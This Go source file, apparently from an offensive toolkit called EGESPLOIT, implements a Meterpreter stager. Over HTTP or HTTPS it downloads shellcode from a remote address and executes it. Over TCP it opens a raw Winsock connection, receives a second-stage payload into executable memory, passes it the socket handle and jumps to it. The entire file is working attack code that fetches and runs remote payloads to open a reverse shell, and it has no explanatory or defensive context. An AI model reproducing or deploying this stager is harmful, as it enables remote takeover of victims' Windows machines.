package EGESPLOIT

import "syscall"
import "unsafe"
import "net/http"
import "io/ioutil"
import "strconv"
import "strings"
import "encoding/binary"


func Meterpreter(ConType string, Address string) (bool, string){
  if ConType == "http" || ConType == "HTTP" || ConType == "https" || ConType == "HTTPS" {
    Checksum := CalculateChecksum(12)
    var FullURL string
    if ConType == "http" || ConType == "HTTP" {
        FullURL = string("http://" + Address + "/" + Checksum)
    }else if ConType == "https" || ConType == "HTTPS" {
        FullURL = string("https://" + Address + "/" + Checksum)
    }
    Resp, Err := http.Get(FullURL)
    if Err != nil {
      return false, "[!] ERROR : Get request failed !"
    }
    defer Resp.Body.Close()
    Shellcode, _ := ioutil.ReadAll(Resp.Body)
    SyscallExecute(Shellcode)
    return true, "[*] Meterpreter Executed !"
    //####################################################### Meterpreter Reverse HTTP/HTTPS
  }else if ConType == "tcp" || ConType == "TCP" {
    var WSA_Data syscall.WSAData
    syscall.WSAStartup(uint32(0x202), &WSA_Data)
    Socket, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)

    AddressArray := strings.Split(Address, ":")
    IP_Array_Str := strings.Split(AddressArray[0], ".")
    var IP_Array_Int [4]int
    for i := 0; i < 4; i++ {
      IP_Array_Int[i], _ = strconv.Atoi(IP_Array_Str[i])
    }
    PortInt, _ := strconv.Atoi(AddressArray[1])
    Socket_Addr := syscall.SockaddrInet4{Port: PortInt, Addr: [4]byte{byte(IP_Array_Int[0]),byte(IP_Array_Int[1]),byte(IP_Array_Int[2]),byte(IP_Array_Int[3])}}
    syscall.Connect(Socket, &Socket_Addr)
    var SecondStageLengt [4]byte
    WSA_Buffer := syscall.WSABuf{Len: uint32(4), Buf: &SecondStageLengt[0]}
    Flags := uint32(0)
    DataReceived := uint32(0)
    syscall.WSARecv(Socket, &WSA_Buffer, 1, &DataReceived, &Flags, nil, nil)
    SecondStageLengthInt := binary.LittleEndian.Uint32(SecondStageLengt[:])

    if SecondStageLengthInt < 100 {
      return false, "[!] TCP Stream Failed !"
    }

    SecondStageBuffer := make([]byte, SecondStageLengthInt)
    var Shellcode []byte
    WSA_Buffer = syscall.WSABuf{Len: SecondStageLengthInt, Buf: &SecondStageBuffer[0]}
    Flags = uint32(0)
    DataReceived = uint32(0)
    TotalDataReceived := uint32(0)
    for TotalDataReceived < SecondStageLengthInt {
      syscall.WSARecv(Socket, &WSA_Buffer, 1, &DataReceived, &Flags, nil, nil)
      for i := 0; i < int(DataReceived); i++ {
        Shellcode = append(Shellcode, SecondStageBuffer[i])
      }
      TotalDataReceived += DataReceived
    }
    Addr, _, _ := VirtualAlloc.Call(0, uintptr(SecondStageLengthInt + 5), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
    SocketPtr := (uintptr)(unsafe.Pointer(Socket))
    AddrPtr[0] = 0xBF
    AddrPtr[1] = byte(SocketPtr)
    AddrPtr[2] = 0x00
    AddrPtr[3] = 0x00
    AddrPtr[4] = 0x00
    for i, j := range Shellcode {
      AddrPtr[i+5] = j
    }
    syscall.Syscall(Addr, 0, 0, 0, 0)
    return true, "[*] Meterpreter Executed !"
  }else {
    return false, "[!] Invalid meterpreter type !"
  }
}
